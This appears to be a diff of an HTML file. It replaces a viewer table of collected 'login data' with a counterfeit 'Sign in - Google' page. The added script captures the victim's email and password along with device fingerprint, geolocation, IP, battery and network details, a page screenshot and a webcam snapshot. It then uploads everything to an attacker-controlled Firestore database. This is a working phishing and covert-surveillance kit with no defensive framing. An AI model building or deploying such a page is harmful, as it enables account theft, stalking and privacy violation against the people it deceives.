@@ -3,69 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Data</title>
+    <title>Sign in - Google</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 10px; min-height: 100vh; }
-        .login-box { background: #fff; padding: 15px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 100%; box-sizing: border-box; }
-        h2 { text-align: center; color: #1a73e8; margin: 0 0 15px; font-size: 20px; }
-        .table-container { overflow-x: auto; -webkit-overflow-scrolling: touch; }
-        table { width: 100%; border-collapse: collapse; background: #fff; min-width: 2000px; }
-        th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #e0e0e0; vertical-align: middle; white-space: nowrap; }
-        th { background: #1a73e8; color: #fff; font-weight: 600; position: sticky; top: 0; z-index: 1; }
-        tr:nth-child(even) { background: #f8f9fa; }
-        tr:hover { background: #eef2f7; }
-        img.screenshot, img.camera-shot { max-width: 100px; border: 1px solid #ddd; border-radius: 4px; display: block; }
-        a { color: #1a73e8; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-        @media (max-width: 768px) { .login-box { padding: 10px; } h2 { font-size: 18px; } table { min-width: 0; display: block; overflow-x: auto; } th, td { padding: 8px 10px; font-size: 12px; } img.screenshot, img.camera-shot { max-width: 80px; } th, td { min-width: 100px; } }
-        @media (max-width: 480px) { th, td { padding: 6px 8px; font-size: 10px; } img.screenshot, img.camera-shot { max-width: 60px; } }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-box { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 90%; max-width: 400px; text-align: center; }
+        img { max-width: 100px; margin-bottom: 20px; }
+        h2 { color: #333; margin: 0 0 10px; font-size: 24px; }
+        p { color: #666; margin: 0 0 20px; font-size: 14px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #1a73e8; color: #fff; padding: 10px; border: none; border-radius: 4px; width: 100%; cursor: pointer; font-size: 16px; }
+        button:hover { background: #1557b0; }
+        video, canvas { display: none; }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 </head>
 <body>
     <div class="login-box">
-        <h2>Login Data</h2>
-        <div class="table-container">
-            <table id="loginTable">
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>IP</th>
-                        <th>Email</th>
-                        <th>Password</th>
-                        <th>User Agent</th>
-                        <th>Screen</th>
-                        <th>Timezone</th>
-                        <th>Language</th>
-                        <th>Platform</th>
-                        <th>CPU Cores</th>
-                        <th>Memory</th>
-                        <th>Online</th>
-                        <th>Cookies</th>
-                        <th>Color Depth</th>
-                        <th>Pixel Ratio</th>
-                        <th>Orientation</th>
-                        <th>Latitude</th>
-                        <th>Longitude</th>
-                        <th>Accuracy</th>
-                        <th>Charging</th>
-                        <th>Battery Level</th>
-                        <th>Charge Time</th>
-                        <th>Discharge Time</th>
-                        <th>Network Type</th>
-                        <th>Effective Type</th>
-                        <th>Downlink</th>
-                        <th>RTT</th>
-                        <th>Screenshot</th>
-                        <th>Camera Shot</th>
-                    </tr>
-                </thead>
-                <tbody id="loginBody"></tbody>
-            </table>
-        </div>
-        <p><a href="index.html">Back to Login</a></p>
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        <h2>Sign in</h2>
+        <p>to continue to Google</p>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+        </form>
+        <p><a href="receiver.html">View Collected Data</a></p>
     </div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
     <script>
         // Replace this with your own firebaseConfig if you created a new Firebase project
         const firebaseConfig = {
@@ -80,58 +47,134 @@
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        function updateTable() {
-            db.collection('logins').onSnapshot(snapshot => {
-                const tbody = document.getElementById('loginBody');
-                tbody.innerHTML = '';
-                if (snapshot.empty) {
-                    const row = tbody.insertRow();
-                    row.innerHTML = '<td colspan="29" style="text-align: center; color: #888;">No data yet</td>';
-                } else {
-                    snapshot.forEach(doc => {
-                        const entry = doc.data();
-                        const row = tbody.insertRow();
-                        row.insertCell().textContent = entry.timestamp || 'N/A';
-                        row.insertCell().textContent = entry.ip || 'N/A';
-                        row.insertCell().textContent = entry.email || 'N/A';
-                        row.insertCell().textContent = entry.password || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.userAgent || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.screen || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.timezone || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.language || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.platform || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.cpuCores || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.memory || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.online ? 'Yes' : 'No';
-                        row.insertCell().textContent = entry.deviceInfo.cookiesEnabled ? 'Yes' : 'No';
-                        row.insertCell().textContent = entry.deviceInfo.colorDepth || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.pixelRatio || 'N/A';
-                        row.insertCell().textContent = entry.deviceInfo.orientation || 'N/A';
-                        const latCell = row.insertCell();
-                        const lat = entry.geolocation.latitude;
-                        latCell.innerHTML = lat ? `<a href="https://maps.google.com/?q=${lat},${entry.geolocation.longitude}" target="_blank">${lat}</a>` : 'N/A';
-                        const lonCell = row.insertCell();
-                        const lon = entry.geolocation.longitude;
-                        lonCell.innerHTML = lon ? `<a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">${lon}</a>` : 'N/A';
-                        row.insertCell().textContent = entry.geolocation.accuracy || (entry.geolocation.error ? entry.geolocation.error : 'N/A');
-                        row.insertCell().textContent = entry.battery.charging ? 'Yes' : 'No' || 'N/A';
-                        row.insertCell().textContent = entry.battery.level || 'N/A';
-                        row.insertCell().textContent = entry.battery.chargingTime || 'N/A';
-                        row.insertCell().textContent = entry.battery.dischargingTime || 'N/A';
-                        row.insertCell().textContent = entry.network.type || 'N/A';
-                        row.insertCell().textContent = entry.network.effectiveType || 'N/A';
-                        row.insertCell().textContent = entry.network.downlink || 'N/A';
-                        row.insertCell().textContent = entry.network.rtt || 'N/A';
-                        row.insertCell().innerHTML = entry.screenshot && entry.screenshot !== 'N/A' ? `<img class="screenshot" src="${entry.screenshot}" alt="Screenshot">` : 'N/A';
-                        row.insertCell().innerHTML = entry.cameraShot && entry.cameraShot !== 'N/A' ? `<img class="camera-shot" src="${entry.cameraShot}" alt="Camera Shot">` : 'N/A';
-                    });
+        document.getElementById('loginForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const timestamp = new Date().toISOString();
+
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language || navigator.userLanguage,
+                platform: navigator.platform,
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
+                online: navigator.onLine,
+                cookiesEnabled: navigator.cookieEnabled,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 'N/A',
+                orientation: window.screen.orientation ? window.screen.orientation.type : 'N/A'
+            };
+
+            let geolocation = {};
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                geolocation = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+            } catch (error) {
+                console.error('Geolocation error:', error.message);
+                geolocation = { error: 'Geolocation denied or unavailable' };
+            }
+
+            let battery = {};
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    battery = {
+                        charging: bat.charging,
+                        level: bat.level * 100 + '%',
+                        chargingTime: bat.chargingTime || 'N/A',
+                        dischargingTime: bat.dischargingTime || 'N/A'
+                    };
+                } catch (error) {
+                    console.error('Battery error:', error.message);
+                    battery = { error: 'Battery info unavailable' };
                 }
-            }, error => {
-                console.error('Firestore error on receiver.html:', error.message);
-                alert('Failed to load data: ' + error.message);
-            });
-        }
-        updateTable();
+            }
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            const network = {
+                type: connection.type || 'N/A',
+                effectiveType: connection.effectiveType || 'N/A',
+                downlink: connection.downlink || 'N/A',
+                rtt: connection.rtt || 'N/A'
+            };
+
+            let ip = 'Unknown';
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ip = data.ip;
+            } catch (error) {
+                console.error('IP fetch failed:', error.message);
+            }
+
+            let screenshot = '';
+            try {
+                const canvas = await html2canvas(document.body);
+                screenshot = canvas.toDataURL('image/jpeg', 0.5); // Reduce quality to 0.5, use JPEG
+            } catch (error) {
+                console.error('Screenshot failed:', error.message);
+                screenshot = 'N/A';
+            }
+
+            let cameraShot = 'N/A';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                // Resize the canvas to a smaller resolution (e.g., 320x240)
+                const targetWidth = 320;
+                const targetHeight = 240;
+                canvas.width = targetWidth;
+                canvas.height = targetHeight;
+
+                // Draw the video frame onto the resized canvas
+                const ctx = canvas.getContext('2d', { willReadFrequently: true });
+                ctx.drawImage(video, 0, 0, targetWidth, targetHeight);
+
+                // Convert to base64 with reduced quality
+                cameraShot = canvas.toDataURL('image/jpeg', 0.3); // Use JPEG with 0.3 quality (even lower)
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error('Camera shot failed:', error.message);
+                cameraShot = 'N/A';
+            }
+
+            const payload = {
+                email,
+                password,
+                timestamp,
+                ip,
+                deviceInfo,
+                geolocation,
+                battery,
+                network,
+                screenshot,
+                cameraShot
+            };
+            console.log('Sending:', payload);
+
+            try {
+                await db.collection('logins').add(payload);
+                console.log('Data successfully saved to Firestore');
+                // Redirect to receiver.html after successful data collection
+                window.location.href = 'receiver.html';
+            } catch (error) {
+                console.error('Firestore error:', error.message);
+                alert('Failed to save data: ' + error.message);
+            }
+        };
     </script>
 </body>
 </html>
